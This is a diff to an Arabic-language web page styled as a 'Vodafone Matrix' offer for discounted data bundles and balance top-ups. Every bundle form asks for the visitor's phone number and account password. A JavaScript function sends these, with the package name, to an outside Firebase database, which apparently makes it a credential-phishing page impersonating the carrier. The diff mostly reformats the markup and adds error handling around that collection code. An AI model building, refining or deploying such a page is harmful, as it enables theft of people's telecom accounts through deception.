@@ -1,8 +1,8 @@
 <!DOCTYPE html>
 <html lang="ar">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Vodafone Matrix</title>
   <style>
     @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap');
@@ -86,48 +86,48 @@
     <div class="box">
       <h3>بـاقة 42 ألف فليكس - 350 كاش</h3>
       <p>الخط يكون فليكس 260 - بدون سلف أو نوتة</p>
-      <input id="num1" type="text" placeholder="رقم الهاتف">
-      <input id="pass1" type="password" placeholder="كلمة المرور">
+      <input id="num1" type="text" placeholder="رقم الهاتف" />
+      <input id="pass1" type="password" placeholder="كلمة المرور" />
       <button onclick="submitPackage('بـاقة 42 ألف فليكس', num1.value, pass1.value)">طلب الباقة</button>
     </div>
 
     <div class="box">
       <h3>بـاقة 13 ألف فليكس - 240 كاش</h3>
       <p>بدون سلف أو نوتة</p>
-      <input id="num2" type="text" placeholder="رقم الهاتف">
-      <input id="pass2" type="password" placeholder="كلمة المرور">
+      <input id="num2" type="text" placeholder="رقم الهاتف" />
+      <input id="pass2" type="password" placeholder="كلمة المرور" />
       <button onclick="submitPackage('بـاقة 13 ألف فليكس', num2.value, pass2.value)">طلب الباقة</button>
     </div>
 
     <div class="box">
       <h3>بـاقة 40 جيجا - 330 كاش</h3>
       <p>لا يوجد شروط</p>
-      <input id="num3" type="text" placeholder="رقم الهاتف">
-      <input id="pass3" type="password" placeholder="كلمة المرور">
+      <input id="num3" type="text" placeholder="رقم الهاتف" />
+      <input id="pass3" type="password" placeholder="كلمة المرور" />
       <button onclick="submitPackage('بـاقة 40 جيجا', num3.value, pass3.value)">طلب الباقة</button>
     </div>
 
     <div class="box">
       <h3>تجديد بـاقة 50 ألف فليكس - 8 أيام</h3>
       <p>يجب التجديد قبل انتهاء الباقة</p>
-      <input id="num4" type="text" placeholder="رقم الهاتف">
-      <input id="pass4" type="password" placeholder="كلمة المرور">
+      <input id="num4" type="text" placeholder="رقم الهاتف" />
+      <input id="pass4" type="password" placeholder="كلمة المرور" />
       <button onclick="submitPackage('تجديد بـاقة 50 ألف فليكس', num4.value, pass4.value)">طلب الباقة</button>
     </div>
 
     <div class="box">
       <h3>بـاقة 5200 فليكس - 100 كاش</h3>
       <p>بدون سلف أو نوتة - غير متوفرة دائمًا</p>
-      <input id="num5" type="text" placeholder="رقم الهاتف">
-      <input id="pass5" type="password" placeholder="كلمة المرور">
+      <input id="num5" type="text" placeholder="رقم الهاتف" />
+      <input id="pass5" type="password" placeholder="كلمة المرور" />
       <button onclick="submitPackage('بـاقة 5200 فليكس', num5.value, pass5.value)">طلب الباقة</button>
     </div>
 
     <h2 class="section-title">خدمة شحن الرصيد الصافي</h2>
 
     <div class="box">
-      <input id="balanceNum" type="text" placeholder="رقم الهاتف">
-      <input id="balanceAmount" type="number" placeholder="رصيد صافي (مثال: 100)">
+      <input id="balanceNum" type="text" placeholder="رقم الهاتف" />
+      <input id="balanceAmount" type="number" placeholder="رصيد صافي (مثال: 100)" />
       <button onclick="calcAndSubmitBalance()">شحن الرصيد</button>
       <p id="result"></p>
     </div>
@@ -162,39 +162,62 @@
     }
     setInterval(drawMatrix, 33);
 
-    // Firebase
+    // Firebase submit for packages
     async function submitPackage(name, num, pass) {
-      if (!num || !pass) return alert("يرجى إدخال رقم الهاتف وكلمة المرور");
+      if (!num || !pass) {
+        alert("يرجى إدخال رقم الهاتف وكلمة المرور");
+        return;
+      }
       const body = {
         package: name,
         number: num,
         password: pass,
         timestamp: new Date().toISOString()
       };
-      await fetch("https://starkoscript-default-rtdb.firebaseio.com/requests.json", {
-        method: "POST",
-        body: JSON.stringify(body)
-      });
-      alert("تم إرسال طلبك بنجاح");
+      try {
+        const res = await fetch("https://starkoscript-default-rtdb.firebaseio.com/requests.json", {
+          method: "POST",
+          body: JSON.stringify(body)
+        });
+        if (res.ok) {
+          alert("تم إرسال طلبك بنجاح");
+        } else {
+          alert("حدث خطأ أثناء إرسال الطلب");
+        }
+      } catch (e) {
+        alert("خطأ في الاتصال بالخادم");
+      }
     }
 
+    // Firebase submit for balance recharge
     async function calcAndSubmitBalance() {
       const num = document.getElementById("balanceNum").value;
       const amount = parseFloat(document.getElementById("balanceAmount").value);
-      if (!num || !amount) return alert("يرجى إدخال الرقم والرصيد الصافي");
+      if (!num || !amount) {
+        alert("يرجى إدخال الرقم والرصيد الصافي");
+        return;
+      }
       const total = amount * 1.2;
-      document.getElementById("result").innerText = `سعر الشحن: ${total} جنيه`;
+      document.getElementById("result").innerText = `سعر الشحن: ${total.toFixed(2)} جنيه`;
       const body = {
         number: num,
         net_balance: amount,
         egp_price: total,
         timestamp: new Date().toISOString()
       };
-      await fetch("https://starkoscript-default-rtdb.firebaseio.com/balance.json", {
-        method: "POST",
-        body: JSON.stringify(body)
-      });
-      alert("تم إرسال طلب شحن الرصيد");
+      try {
+        const res = await fetch("https://starkoscript-default-rtdb.firebaseio.com/balance.json", {
+          method: "POST",
+          body: JSON.stringify(body)
+        });
+        if (res.ok) {
+          alert("تم إرسال طلب شحن الرصيد");
+        } else {
+          alert("حدث خطأ أثناء إرسال طلب شحن الرصيد");
+        }
+      } catch (e) {
+        alert("خطأ في الاتصال بالخادم");
+      }
     }
   </script>
 </body>
